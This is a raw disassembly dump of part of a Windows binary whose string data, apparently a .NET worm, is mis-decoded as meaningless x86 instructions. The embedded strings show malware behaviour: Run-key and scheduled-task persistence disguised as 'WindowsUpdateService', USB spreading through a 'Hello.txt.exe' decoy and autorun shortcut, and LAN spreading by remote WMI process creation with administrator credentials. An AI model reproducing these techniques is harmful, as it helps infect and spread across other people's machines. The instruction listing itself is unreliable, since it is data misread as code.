  407505:	00 0b                	add    %cl,(%ebx)
  407507:	55                   	push   %ebp
  407508:	00 73 00             	add    %dh,0x0(%ebx)
  40750b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40750f:	73 00                	jae    0x407511
  407511:	00 0d 50 00 75 00    	add    %cl,0x750050
  407517:	62 00                	bound  %eax,(%eax)
  407519:	6c                   	insb   (%dx),%es:(%edi)
  40751a:	00 69 00             	add    %ch,0x0(%ecx)
  40751d:	63 00                	arpl   %eax,(%eax)
  40751f:	00 13                	add    %dl,(%ebx)
  407521:	44                   	inc    %esp
  407522:	00 6f 00             	add    %ch,0x0(%edi)
  407525:	63 00                	arpl   %eax,(%eax)
  407527:	75 00                	jne    0x407529
  407529:	6d                   	insl   (%dx),%es:(%edi)
  40752a:	00 65 00             	add    %ah,0x0(%ebp)
  40752d:	6e                   	outsb  %ds:(%esi),(%dx)
  40752e:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  407532:	00 00                	add    %al,(%eax)
  407534:	13 44 00 6f          	adc    0x6f(%eax,%eax,1),%eax
  407538:	00 77 00             	add    %dh,0x0(%edi)
  40753b:	6e                   	outsb  %ds:(%esi),(%dx)
  40753c:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  407540:	00 61 00             	add    %ah,0x0(%ecx)
  407543:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  407547:	00 0d 53 00 68 00    	add    %cl,0x680053
  40754d:	61                   	popa
  40754e:	00 72 00             	add    %dh,0x0(%edx)
  407551:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407556:	09 54 00 65          	or     %edx,0x65(%eax,%eax,1)
  40755a:	00 6d 00             	add    %ch,0x0(%ebp)
  40755d:	70 00                	jo     0x40755f
  40755f:	00 09                	add    %cl,(%ecx)
  407561:	49                   	dec    %ecx
  407562:	00 50 00             	add    %dl,0x0(%eax)
  407565:	43                   	inc    %ebx
  407566:	00 24 00             	add    %ah,(%eax,%eax,1)
  407569:	00 49 61             	add    %cl,0x61(%ecx)
  40756c:	00 62 00             	add    %ah,0x0(%edx)
  40756f:	63 00                	arpl   %eax,(%eax)
  407571:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407575:	66 00 67 00          	data16 add %ah,0x0(%edi)
  407579:	68 00 69 00 6a       	push   $0x6a006900
  40757e:	00 6b 00             	add    %ch,0x0(%ebx)
  407581:	6c                   	insb   (%dx),%es:(%edi)
  407582:	00 6d 00             	add    %ch,0x0(%ebp)
  407585:	6e                   	outsb  %ds:(%esi),(%dx)
  407586:	00 6f 00             	add    %ch,0x0(%edi)
  407589:	70 00                	jo     0x40758b
  40758b:	71 00                	jno    0x40758d
  40758d:	72 00                	jb     0x40758f
  40758f:	73 00                	jae    0x407591
  407591:	74 00                	je     0x407593
  407593:	75 00                	jne    0x407595
  407595:	76 00                	jbe    0x407597
  407597:	77 00                	ja     0x407599
  407599:	78 00                	js     0x40759b
  40759b:	79 00                	jns    0x40759d
  40759d:	7a 00                	jp     0x40759f
  40759f:	30 00                	xor    %al,(%eax)
  4075a1:	31 00                	xor    %eax,(%eax)
  4075a3:	32 00                	xor    (%eax),%al
  4075a5:	33 00                	xor    (%eax),%eax
  4075a7:	34 00                	xor    $0x0,%al
  4075a9:	35 00 36 00 37       	xor    $0x37003600,%eax
  4075ae:	00 38                	add    %bh,(%eax)
  4075b0:	00 39                	add    %bh,(%ecx)
  4075b2:	00 00                	add    %al,(%eax)
  4075b4:	09 2e                	or     %ebp,(%esi)
  4075b6:	00 65 00             	add    %ah,0x0(%ebp)
  4075b9:	78 00                	js     0x4075bb
  4075bb:	65 00 00             	add    %al,%gs:(%eax)
  4075be:	5b                   	pop    %ebx
  4075bf:	53                   	push   %ebx
  4075c0:	00 6f 00             	add    %ch,0x0(%edi)
  4075c3:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4075c8:	00 61 00             	add    %ah,0x0(%ecx)
  4075cb:	72 00                	jb     0x4075cd
  4075cd:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4075d2:	00 69 00             	add    %ch,0x0(%ecx)
  4075d5:	63 00                	arpl   %eax,(%eax)
  4075d7:	72 00                	jb     0x4075d9
  4075d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4075da:	00 73 00             	add    %dh,0x0(%ebx)
  4075dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4075de:	00 66 00             	add    %ah,0x0(%esi)
  4075e1:	74 00                	je     0x4075e3
  4075e3:	5c                   	pop    %esp
  4075e4:	00 57 00             	add    %dl,0x0(%edi)
  4075e7:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4075ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ee:	00 77 00             	add    %dh,0x0(%edi)
  4075f1:	73 00                	jae    0x4075f3
  4075f3:	5c                   	pop    %esp
  4075f4:	00 43 00             	add    %al,0x0(%ebx)
  4075f7:	75 00                	jne    0x4075f9
  4075f9:	72 00                	jb     0x4075fb
  4075fb:	72 00                	jb     0x4075fd
  4075fd:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407601:	74 00                	je     0x407603
  407603:	56                   	push   %esi
  407604:	00 65 00             	add    %ah,0x0(%ebp)
  407607:	72 00                	jb     0x407609
  407609:	73 00                	jae    0x40760b
  40760b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407611:	5c                   	pop    %esp
  407612:	00 52 00             	add    %dl,0x0(%edx)
  407615:	75 00                	jne    0x407617
  407617:	6e                   	outsb  %ds:(%esi),(%dx)
  407618:	00 00                	add    %al,(%eax)
  40761a:	29 57 00             	sub    %edx,0x0(%edi)
  40761d:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407623:	6f                   	outsl  %ds:(%esi),(%dx)
  407624:	00 77 00             	add    %dh,0x0(%edi)
  407627:	73 00                	jae    0x407629
  407629:	55                   	push   %ebp
  40762a:	00 70 00             	add    %dh,0x0(%eax)
  40762d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407631:	74 00                	je     0x407633
  407633:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  407637:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40763b:	76 00                	jbe    0x40763d
  40763d:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  407643:	00 4b 2f             	add    %cl,0x2f(%ebx)
  407646:	00 43 00             	add    %al,0x0(%ebx)
  407649:	72 00                	jb     0x40764b
  40764b:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40764f:	74 00                	je     0x407651
  407651:	65 00 20             	add    %ah,%gs:(%eax)
  407654:	00 2f                	add    %ch,(%edi)
  407656:	00 53 00             	add    %dl,0x0(%ebx)
  407659:	43                   	inc    %ebx
  40765a:	00 20                	add    %ah,(%eax)
  40765c:	00 4f 00             	add    %cl,0x0(%edi)
  40765f:	4e                   	dec    %esi
  407660:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  407664:	00 47 00             	add    %al,0x0(%edi)
  407667:	4f                   	dec    %edi
  407668:	00 4e 00             	add    %cl,0x0(%esi)
  40766b:	20 00                	and    %al,(%eax)
  40766d:	2f                   	das
  40766e:	00 52 00             	add    %dl,0x0(%edx)
  407671:	4c                   	dec    %esp
  407672:	00 20                	add    %ah,(%eax)
  407674:	00 48 00             	add    %cl,0x0(%eax)
  407677:	49                   	dec    %ecx
  407678:	00 47 00             	add    %al,0x0(%edi)
  40767b:	48                   	dec    %eax
  40767c:	00 45 00             	add    %al,0x0(%ebp)
  40767f:	53                   	push   %ebx
  407680:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  407684:	00 2f                	add    %ch,(%edi)
  407686:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40768a:	00 20                	add    %ah,(%eax)
  40768c:	00 22                	add    %ah,(%edx)
  40768e:	00 00                	add    %al,(%eax)
  407690:	0f 22 00             	mov    %eax,%cr0
  407693:	20 00                	and    %al,(%eax)
  407695:	2f                   	das
  407696:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40769a:	00 20                	add    %ah,(%eax)
  40769c:	00 22                	add    %ah,(%edx)
  40769e:	00 00                	add    %al,(%eax)
  4076a0:	09 22                	or     %esp,(%edx)
  4076a2:	00 20                	add    %ah,(%eax)
  4076a4:	00 2f                	add    %ch,(%edi)
  4076a6:	00 46 00             	add    %al,0x0(%esi)
  4076a9:	00 19                	add    %bl,(%ecx)
  4076ab:	73 00                	jae    0x4076ad
  4076ad:	63 00                	arpl   %eax,(%eax)
  4076af:	68 00 74 00 61       	push   $0x61007400
  4076b4:	00 73 00             	add    %dh,0x0(%ebx)
  4076b7:	6b 00 73             	imul   $0x73,(%eax),%eax
  4076ba:	00 2e                	add    %ch,(%esi)
  4076bc:	00 65 00             	add    %ah,0x0(%ebp)
  4076bf:	78 00                	js     0x4076c1
  4076c1:	65 00 00             	add    %al,%gs:(%eax)
  4076c4:	0b 2a                	or     (%edx),%ebp
  4076c6:	00 2e                	add    %ch,(%esi)
  4076c8:	00 65 00             	add    %ah,0x0(%ebp)
  4076cb:	78 00                	js     0x4076cd
  4076cd:	65 00 00             	add    %al,%gs:(%eax)
  4076d0:	19 53 00             	sbb    %edx,0x0(%ebx)
  4076d3:	79 00                	jns    0x4076d5
  4076d5:	73 00                	jae    0x4076d7
  4076d7:	74 00                	je     0x4076d9
  4076d9:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4076dd:	55                   	push   %ebp
  4076de:	00 70 00             	add    %dh,0x0(%eax)
  4076e1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4076e5:	74 00                	je     0x4076e7
  4076e7:	65 00 00             	add    %al,%gs:(%eax)
  4076ea:	15 6e 00 65 00       	adc    $0x65006e,%eax
  4076ef:	62 00                	bound  %eax,(%eax)
  4076f1:	75 00                	jne    0x4076f3
  4076f3:	6c                   	insb   (%dx),%es:(%edi)
  4076f4:	00 61 00             	add    %ah,0x0(%ecx)
  4076f7:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4076fb:	78 00                	js     0x4076fd
  4076fd:	65 00 00             	add    %al,%gs:(%eax)
  407700:	19 73 00             	sbb    %esi,0x0(%ebx)
  407703:	6c                   	insb   (%dx),%es:(%edi)
  407704:	00 6f 00             	add    %ch,0x0(%edi)
  407707:	77 00                	ja     0x407709
  407709:	20 00                	and    %al,(%eax)
  40770b:	73 00                	jae    0x40770d
  40770d:	74 00                	je     0x40770f
  40770f:	6f                   	outsl  %ds:(%esi),(%dx)
  407710:	00 70 00             	add    %dh,0x0(%eax)
  407713:	70 00                	jo     0x407715
  407715:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40771a:	29 5b 00             	sub    %ebx,0x0(%ebx)
  40771d:	53                   	push   %ebx
  40771e:	00 70 00             	add    %dh,0x0(%eax)
  407721:	72 00                	jb     0x407723
  407723:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407727:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40772b:	6e                   	outsb  %ds:(%esi),(%dx)
  40772c:	00 67 00             	add    %ah,0x0(%edi)
  40772f:	5d                   	pop    %ebp
  407730:	00 20                	add    %ah,(%eax)
  407732:	00 53 00             	add    %dl,0x0(%ebx)
  407735:	74 00                	je     0x407737
  407737:	6f                   	outsl  %ds:(%esi),(%dx)
  407738:	00 70 00             	add    %dh,0x0(%eax)
  40773b:	70 00                	jo     0x40773d
  40773d:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  407742:	00 00                	add    %al,(%eax)
  407744:	7d 61                	jge    0x4077a7
  407746:	00 62 00             	add    %ah,0x0(%edx)
  407749:	63 00                	arpl   %eax,(%eax)
  40774b:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40774f:	66 00 67 00          	data16 add %ah,0x0(%edi)
  407753:	68 00 69 00 6a       	push   $0x6a006900
  407758:	00 6b 00             	add    %ch,0x0(%ebx)
  40775b:	6c                   	insb   (%dx),%es:(%edi)
  40775c:	00 6d 00             	add    %ch,0x0(%ebp)
  40775f:	6e                   	outsb  %ds:(%esi),(%dx)
  407760:	00 6f 00             	add    %ch,0x0(%edi)
  407763:	70 00                	jo     0x407765
  407765:	71 00                	jno    0x407767
  407767:	72 00                	jb     0x407769
  407769:	73 00                	jae    0x40776b
  40776b:	74 00                	je     0x40776d
  40776d:	75 00                	jne    0x40776f
  40776f:	76 00                	jbe    0x407771
  407771:	77 00                	ja     0x407773
  407773:	78 00                	js     0x407775
  407775:	79 00                	jns    0x407777
  407777:	7a 00                	jp     0x407779
  407779:	41                   	inc    %ecx
  40777a:	00 42 00             	add    %al,0x0(%edx)
  40777d:	43                   	inc    %ebx
  40777e:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  407782:	00 46 00             	add    %al,0x0(%esi)
  407785:	47                   	inc    %edi
  407786:	00 48 00             	add    %cl,0x0(%eax)
  407789:	49                   	dec    %ecx
  40778a:	00 4a 00             	add    %cl,0x0(%edx)
  40778d:	4b                   	dec    %ebx
  40778e:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  407792:	00 4e 00             	add    %cl,0x0(%esi)
  407795:	4f                   	dec    %edi
  407796:	00 50 00             	add    %dl,0x0(%eax)
  407799:	51                   	push   %ecx
  40779a:	00 52 00             	add    %dl,0x0(%edx)
  40779d:	53                   	push   %ebx
  40779e:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  4077a2:	00 56 00             	add    %dl,0x0(%esi)
  4077a5:	57                   	push   %edi
  4077a6:	00 58 00             	add    %bl,0x0(%eax)
  4077a9:	59                   	pop    %ecx
  4077aa:	00 5a 00             	add    %bl,0x0(%edx)
  4077ad:	30 00                	xor    %al,(%eax)
  4077af:	31 00                	xor    %eax,(%eax)
  4077b1:	32 00                	xor    (%eax),%al
  4077b3:	33 00                	xor    (%eax),%eax
  4077b5:	34 00                	xor    $0x0,%al
  4077b7:	35 00 36 00 37       	xor    $0x37003600,%eax
  4077bc:	00 38                	add    %bh,(%eax)
  4077be:	00 39                	add    %bh,(%ecx)
  4077c0:	00 00                	add    %al,(%eax)
  4077c2:	1b 48 00             	sbb    0x0(%eax),%ecx
  4077c5:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  4077ca:	00 6f 00             	add    %ch,0x0(%edi)
  4077cd:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  4077d2:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  4077d6:	00 65 00             	add    %ah,0x0(%ebp)
  4077d9:	78 00                	js     0x4077db
  4077db:	65 00 00             	add    %al,%gs:(%eax)
  4077de:	17                   	pop    %ss
  4077df:	61                   	popa
  4077e0:	00 75 00             	add    %dh,0x0(%ebp)
  4077e3:	74 00                	je     0x4077e5
  4077e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4077e6:	00 72 00             	add    %dh,0x0(%edx)
  4077e9:	75 00                	jne    0x4077eb
  4077eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4077ec:	00 2e                	add    %ch,(%esi)
  4077ee:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  4077f2:	00 6b 00             	add    %ch,0x0(%ebx)
  4077f5:	00 25 55 00 53 00    	add    %ah,0x530055
  4077fb:	42                   	inc    %edx
  4077fc:	00 20                	add    %ah,(%eax)
  4077fe:	00 53 00             	add    %dl,0x0(%ebx)
  407801:	70 00                	jo     0x407803
  407803:	72 00                	jb     0x407805
  407805:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407809:	64 00 20             	add    %ah,%fs:(%eax)
  40780c:	00 45 00             	add    %al,0x0(%ebp)
  40780f:	72 00                	jb     0x407811
  407811:	72 00                	jb     0x407813
  407813:	6f                   	outsl  %ds:(%esi),(%dx)
  407814:	00 72 00             	add    %dh,0x0(%edx)
  407817:	3a 00                	cmp    (%eax),%al
  407819:	20 00                	and    %al,(%eax)
  40781b:	00 80 9d 22 00 0d    	add    %al,0xd00229d(%eax)
  407821:	00 0a                	add    %cl,(%edx)
  407823:	00 6f 00             	add    %ch,0x0(%edi)
  407826:	4c                   	dec    %esp
  407827:	00 69 00             	add    %ch,0x0(%ecx)
  40782a:	6e                   	outsb  %ds:(%esi),(%dx)
  40782b:	00 6b 00             	add    %ch,0x0(%ebx)
  40782e:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  407832:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407838:	6f                   	outsl  %ds:(%esi),(%dx)
  407839:	00 77 00             	add    %dh,0x0(%edi)
  40783c:	53                   	push   %ebx
  40783d:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  407841:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407845:	00 20                	add    %ah,(%eax)
  407847:	00 3d 00 20 00 31    	add    %bh,0x31002000
  40784d:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  407853:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  407857:	00 6e 00             	add    %ch,0x0(%esi)
  40785a:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40785d:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  407861:	00 73 00             	add    %dh,0x0(%ebx)
  407864:	63 00                	arpl   %eax,(%eax)
  407866:	72 00                	jb     0x407868
  407868:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40786e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407874:	20 00                	and    %al,(%eax)
  407876:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40787b:	00 57 00             	add    %dl,0x0(%edi)
  40787e:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407884:	6f                   	outsl  %ds:(%esi),(%dx)
  407885:	00 77 00             	add    %dh,0x0(%edi)
  407888:	73 00                	jae    0x40788a
  40788a:	20 00                	and    %al,(%eax)
  40788c:	53                   	push   %ebx
  40788d:	00 68 00             	add    %ch,0x0(%eax)
  407890:	6f                   	outsl  %ds:(%esi),(%dx)
  407891:	00 72 00             	add    %dh,0x0(%edx)
  407894:	74 00                	je     0x407896
  407896:	63 00                	arpl   %eax,(%eax)
  407898:	75 00                	jne    0x40789a
  40789a:	74 00                	je     0x40789c
  40789c:	22 00                	and    (%eax),%al
  40789e:	0d 00 0a 00 6f       	or     $0x6f000a00,%eax
  4078a3:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4078a7:	00 6e 00             	add    %ch,0x0(%esi)
  4078aa:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  4078ad:	00 53 00             	add    %dl,0x0(%ebx)
  4078b0:	61                   	popa
  4078b1:	00 76 00             	add    %dh,0x0(%esi)
  4078b4:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  4078bb:	09 74 00 65          	or     %esi,0x65(%eax,%eax,1)
  4078bf:	00 6d 00             	add    %ch,0x0(%ebp)
  4078c2:	70 00                	jo     0x4078c4
  4078c4:	00 21                	add    %ah,(%ecx)
  4078c6:	53                   	push   %ebx
  4078c7:	00 68 00             	add    %ch,0x0(%eax)
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	00 72 00             	add    %dh,0x0(%edx)
  4078ce:	74 00                	je     0x4078d0
  4078d0:	63 00                	arpl   %eax,(%eax)
  4078d2:	75 00                	jne    0x4078d4
  4078d4:	74 00                	je     0x4078d6
  4078d6:	20 00                	and    %al,(%eax)
  4078d8:	45                   	inc    %ebp
  4078d9:	00 72 00             	add    %dh,0x0(%edx)
  4078dc:	72 00                	jb     0x4078de
  4078de:	6f                   	outsl  %ds:(%esi),(%dx)
  4078df:	00 72 00             	add    %dh,0x0(%edx)
  4078e2:	3a 00                	cmp    (%eax),%al
  4078e4:	20 00                	and    %al,(%eax)
  4078e6:	00 43 54             	add    %al,0x54(%ebx)
  4078e9:	00 41 00             	add    %al,0x0(%ecx)
  4078ec:	52                   	push   %edx
  4078ed:	00 47 00             	add    %al,0x0(%edi)
  4078f0:	45                   	inc    %ebp
  4078f1:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  4078f5:	00 4d 00             	add    %cl,0x0(%ebp)
  4078f8:	41                   	inc    %ecx
  4078f9:	00 43 00             	add    %al,0x0(%ebx)
  4078fc:	48                   	dec    %eax
  4078fd:	00 49 00             	add    %cl,0x0(%ecx)
  407900:	4e                   	dec    %esi
  407901:	00 45 00             	add    %al,0x0(%ebp)
  407904:	5f                   	pop    %edi
  407905:	00 4e 00             	add    %cl,0x0(%esi)
  407908:	41                   	inc    %ecx
  407909:	00 4d 00             	add    %cl,0x0(%ebp)
  40790c:	45                   	inc    %ebp
  40790d:	00 5c 00 41          	add    %bl,0x41(%eax,%eax,1)
  407911:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  407915:	00 69 00             	add    %ch,0x0(%ecx)
  407918:	6e                   	outsb  %ds:(%esi),(%dx)
  407919:	00 69 00             	add    %ch,0x0(%ecx)
  40791c:	73 00                	jae    0x40791e
  40791e:	74 00                	je     0x407920
  407920:	72 00                	jb     0x407922
  407922:	61                   	popa
  407923:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  407927:	00 72 00             	add    %dh,0x0(%edx)
  40792a:	00 19                	add    %bl,(%ecx)
  40792c:	79 00                	jns    0x40792e
  40792e:	6f                   	outsl  %ds:(%esi),(%dx)
  40792f:	00 75 00             	add    %dh,0x0(%ebp)
  407932:	72 00                	jb     0x407934
  407934:	70 00                	jo     0x407936
  407936:	61                   	popa
  407937:	00 73 00             	add    %dh,0x0(%ebx)
  40793a:	73 00                	jae    0x40793c
  40793c:	77 00                	ja     0x40793e
  40793e:	6f                   	outsl  %ds:(%esi),(%dx)
  40793f:	00 72 00             	add    %dh,0x0(%edx)
  407942:	64 00 00             	add    %al,%fs:(%eax)
  407945:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40794a:	00 17                	add    %dl,(%edi)
  40794c:	5c                   	pop    %esp
  40794d:	00 72 00             	add    %dh,0x0(%edx)
  407950:	6f                   	outsl  %ds:(%esi),(%dx)
  407951:	00 6f 00             	add    %ch,0x0(%edi)
  407954:	74 00                	je     0x407956
  407956:	5c                   	pop    %esp
  407957:	00 63 00             	add    %ah,0x0(%ebx)
  40795a:	69 00 6d 00 76 00    	imul   $0x76006d,(%eax),%eax
  407960:	32 00                	xor    (%eax),%al
  407962:	00 4b 5b             	add    %cl,0x5b(%ebx)
  407965:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407969:	00 6e 00             	add    %ch,0x0(%esi)
  40796c:	53                   	push   %ebx
  40796d:	00 70 00             	add    %dh,0x0(%eax)
  407970:	72 00                	jb     0x407972
  407972:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407976:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  40797a:	20 00                	and    %al,(%eax)
  40797c:	57                   	push   %edi
  40797d:	00 4d 00             	add    %cl,0x0(%ebp)
  407980:	49                   	dec    %ecx
  407981:	00 20                	add    %ah,(%eax)
  407983:	00 63 00             	add    %ah,0x0(%ebx)
  407986:	6f                   	outsl  %ds:(%esi),(%dx)
  407987:	00 6e 00             	add    %ch,0x0(%esi)
  40798a:	6e                   	outsb  %ds:(%esi),(%dx)
  40798b:	00 65 00             	add    %ah,0x0(%ebp)
  40798e:	63 00                	arpl   %eax,(%eax)
  407990:	74 00                	je     0x407992
  407992:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407998:	20 00                	and    %al,(%eax)
  40799a:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40799e:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4079a4:	64 00 20             	add    %ah,%fs:(%eax)
  4079a7:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4079ab:	00 20                	add    %ah,(%eax)
  4079ad:	00 00                	add    %al,(%eax)
  4079af:	1b 57 00             	sbb    0x0(%edi),%edx
  4079b2:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  4079b8:	32 00                	xor    (%eax),%al
  4079ba:	5f                   	pop    %edi
  4079bb:	00 50 00             	add    %dl,0x0(%eax)
  4079be:	72 00                	jb     0x4079c0
  4079c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4079c1:	00 63 00             	add    %ah,0x0(%ebx)
  4079c4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4079c8:	73 00                	jae    0x4079ca
  4079ca:	00 0d 43 00 72 00    	add    %cl,0x720043
  4079d0:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4079d4:	74 00                	je     0x4079d6
  4079d6:	65 00 00             	add    %al,%gs:(%eax)
  4079d9:	17                   	pop    %ss
  4079da:	43                   	inc    %ebx
  4079db:	00 6f 00             	add    %ch,0x0(%edi)
  4079de:	6d                   	insl   (%dx),%es:(%edi)
  4079df:	00 6d 00             	add    %ch,0x0(%ebp)
  4079e2:	61                   	popa
  4079e3:	00 6e 00             	add    %ch,0x0(%esi)
  4079e6:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  4079eb:	00 6e 00             	add    %ch,0x0(%esi)
  4079ee:	65 00 00             	add    %al,%gs:(%eax)
  4079f1:	17                   	pop    %ss
  4079f2:	52                   	push   %edx
  4079f3:	00 65 00             	add    %ah,0x0(%ebp)
  4079f6:	74 00                	je     0x4079f8
  4079f8:	75 00                	jne    0x4079fa
  4079fa:	72 00                	jb     0x4079fc
  4079fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4079fd:	00 56 00             	add    %dl,0x0(%esi)
  407a00:	61                   	popa
  407a01:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  407a05:	00 65 00             	add    %ah,0x0(%ebp)
  407a08:	00 51 5b             	add    %dl,0x5b(%ecx)
  407a0b:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407a0f:	00 6e 00             	add    %ch,0x0(%esi)
  407a12:	53                   	push   %ebx
  407a13:	00 70 00             	add    %dh,0x0(%eax)
  407a16:	72 00                	jb     0x407a18
  407a18:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407a1c:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407a20:	20 00                	and    %al,(%eax)
  407a22:	52                   	push   %edx
  407a23:	00 65 00             	add    %ah,0x0(%ebp)
  407a26:	6d                   	insl   (%dx),%es:(%edi)
  407a27:	00 6f 00             	add    %ch,0x0(%edi)
  407a2a:	74 00                	je     0x407a2c
  407a2c:	65 00 20             	add    %ah,%gs:(%eax)
  407a2f:	00 65 00             	add    %ah,0x0(%ebp)
  407a32:	78 00                	js     0x407a34
  407a34:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407a38:	75 00                	jne    0x407a3a
  407a3a:	74 00                	je     0x407a3c
  407a3c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407a42:	20 00                	and    %al,(%eax)
  407a44:	73 00                	jae    0x407a46
  407a46:	74 00                	je     0x407a48
  407a48:	61                   	popa
  407a49:	00 72 00             	add    %dh,0x0(%edx)
  407a4c:	74 00                	je     0x407a4e
  407a4e:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  407a53:	00 6f 00             	add    %ch,0x0(%edi)
  407a56:	6e                   	outsb  %ds:(%esi),(%dx)
  407a57:	00 20                	add    %ah,(%eax)
  407a59:	00 00                	add    %al,(%eax)
  407a5b:	4f                   	dec    %edi
  407a5c:	5b                   	pop    %ebx
  407a5d:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407a61:	00 6e 00             	add    %ch,0x0(%esi)
  407a64:	53                   	push   %ebx
  407a65:	00 70 00             	add    %dh,0x0(%eax)
  407a68:	72 00                	jb     0x407a6a
  407a6a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407a6e:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407a72:	20 00                	and    %al,(%eax)
  407a74:	52                   	push   %edx
  407a75:	00 65 00             	add    %ah,0x0(%ebp)
  407a78:	6d                   	insl   (%dx),%es:(%edi)
  407a79:	00 6f 00             	add    %ch,0x0(%edi)
  407a7c:	74 00                	je     0x407a7e
  407a7e:	65 00 20             	add    %ah,%gs:(%eax)
  407a81:	00 65 00             	add    %ah,0x0(%ebp)
  407a84:	78 00                	js     0x407a86
  407a86:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407a8a:	75 00                	jne    0x407a8c
  407a8c:	74 00                	je     0x407a8e
  407a8e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407a94:	20 00                	and    %al,(%eax)
  407a96:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407a9a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  407aa0:	64 00 20             	add    %ah,%fs:(%eax)
  407aa3:	00 6f 00             	add    %ch,0x0(%edi)
  407aa6:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa7:	00 20                	add    %ah,(%eax)
  407aa9:	00 00                	add    %al,(%eax)
  407aab:	17                   	pop    %ss
  407aac:	20 00                	and    %al,(%eax)
  407aae:	77 00                	ja     0x407ab0
  407ab0:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  407ab6:	20 00                	and    %al,(%eax)
  407ab8:	63 00                	arpl   %eax,(%eax)
  407aba:	6f                   	outsl  %ds:(%esi),(%dx)
  407abb:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
